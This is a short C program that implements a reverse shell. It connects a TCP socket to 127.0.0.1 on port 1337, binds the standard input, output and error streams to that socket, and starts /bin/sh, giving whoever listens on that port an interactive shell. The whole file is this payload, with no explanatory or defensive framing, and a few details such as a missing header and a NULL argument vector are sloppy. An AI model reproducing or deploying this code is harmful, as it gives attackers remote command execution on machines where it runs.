#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(void) {
  // Create a socket
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);

  // Set up the sockaddr_in structure
  struct sockaddr_in serv_addr;
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(1337);
  serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

  // Connect to the server
  connect(sockfd, (struct sockaddr*) &serv_addr, sizeof(serv_addr));

  // Duplicate file descriptors for stdin, stdout, and stderr
  dup2(sockfd, STDIN_FILENO);
  dup2(sockfd, STDOUT_FILENO);
  dup2(sockfd, STDERR_FILENO);

  // Run the shell
  execve("/bin/sh", NULL, NULL);

  // Close the socket
  close(sockfd);

  return 0;
}